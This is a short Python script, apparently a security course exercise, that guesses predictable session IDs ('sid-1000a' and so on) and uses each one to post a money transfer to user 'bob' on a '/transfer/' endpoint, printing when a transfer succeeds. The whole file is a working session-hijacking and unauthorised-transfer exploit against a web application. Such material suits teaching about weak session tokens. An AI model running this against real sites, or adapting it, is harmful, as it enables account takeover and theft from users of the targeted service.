import sys
import requests

TO_USER = 'bob'
AMOUNT = '10'
def test_session(address):
	for i in range(12):
		for j in ['a','b','c']:
			response = requests.post(
				address+'/transfer/', 
			    cookies={'sessionid': 'sid-'+str(1000+(5*i))+j}, 
				data={'to': TO_USER, 'amount': AMOUNT})
			# print('sid-'+str(1000+(5*i))+j)
			if response.status_code == 200:
				print("Transfer success")
	return None



def main(argv):
	address = sys.argv[1]
	print(test_session(address))

# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
